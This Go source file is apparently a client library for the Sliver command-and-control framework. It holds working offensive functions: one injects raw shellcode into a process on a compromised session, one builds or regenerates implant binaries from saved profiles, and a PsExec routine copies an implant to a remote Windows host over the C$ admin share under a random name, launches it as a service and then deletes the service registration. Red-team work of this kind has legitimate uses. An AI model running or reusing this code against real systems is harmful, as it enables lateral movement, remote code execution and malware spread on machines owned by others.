package sliver

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// gzipEncode compresses data at BestSpeed, matching the sliver server's Gzip encoder.
func gzipEncode(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
	if err != nil {
		return nil, err
	}
	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// ExecuteShellcode injects raw shellcode into a process on the session.
func (c *Client) ExecuteShellcode(sessionID string, data []byte, pid uint32, rwxPages bool) error {
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	resp, err := c.RPC.Task(ctx, &sliverpb.TaskReq{
		Data:     data,
		RWXPages: rwxPages,
		Pid:      pid,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// profileBinary returns the implant binary bytes for a profile, reusing an existing
// build when one exists and otherwise compiling a fresh implant.
func (c *Client) profileBinary(profileName string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	profiles, err := c.RPC.ImplantProfiles(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var cfg *clientpb.ImplantConfig
	for _, p := range profiles.Profiles {
		if p != nil && p.GetName() == profileName {
			cfg = p.Config
			break
		}
	}
	if cfg == nil {
		return nil, fmt.Errorf("no profile found for name %s", profileName)
	}

	implantName := profileName

	builds, err := c.RPC.ImplantBuilds(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	if _, ok := builds.GetConfigs()[implantName]; ok {
		resp, err := c.RPC.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: implantName})
		if err != nil {
			return nil, err
		}
		return resp.GetFile().GetData(), nil
	}
	resp, err := c.RPC.Generate(ctx, &clientpb.GenerateReq{Config: cfg, Name: implantName})
	if err != nil {
		return nil, err
	}
	return resp.GetFile().GetData(), nil
}

func randomHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return hex.EncodeToString([]byte(fmt.Sprintf("%d", time.Now().UnixNano())))
	}
	return hex.EncodeToString(b)
}

// PsExec deploys an implant to a remote host as a Windows service via the session.
// It regenerates/reuses the profile's binary, uploads it over SMB (\\host\C$), starts
// the service, then removes the service registration.
func (c *Client) PsExec(sessionID, hostname, profileName, serviceName, serviceDesc, binPath string) (map[string]string, error) {
	if profileName == "" {
		return nil, fmt.Errorf("profile name is required")
	}
	if hostname == "" {
		return nil, fmt.Errorf("hostname is required")
	}
	if binPath == "" {
		binPath = `C:\Windows\Temp`
	}
	if serviceName == "" {
		serviceName = "Sliver"
	}
	if serviceDesc == "" {
		serviceDesc = "Sliver implant"
	}

	binary, err := c.profileBinary(profileName)
	if err != nil {
		return nil, err
	}

	filename := randomHex(6) + ".exe"
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
	filePath := fmt.Sprintf(`%s\%s`, uploadPath, filename)

	compressed, err := gzipEncode(binary)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	upload, err := c.RPC.Upload(ctx, &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    compressed,
		Path:    filePath,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if upload.GetResponse().GetErr() != "" {
		return nil, errors.New(upload.GetResponse().GetErr())
	}

	// Give AV a moment to scan the freshly uploaded binary before starting it.
	time.Sleep(5 * time.Second)

	binaryPath := fmt.Sprintf(`%s\%s`, binPath, filename)
	if err := c.StartService(sessionID, serviceName, serviceDesc, binaryPath, hostname, ""); err != nil {
		return nil, err
	}
	if err := c.RemoveService(sessionID, serviceName, hostname); err != nil {
		return nil, err
	}
	return map[string]string{
		"hostname": hostname,
		"path":     filePath,
		"service":  serviceName,
		"message":  fmt.Sprintf("deployed %s to %s and started service %s", filename, hostname, serviceName),
	}, nil
}
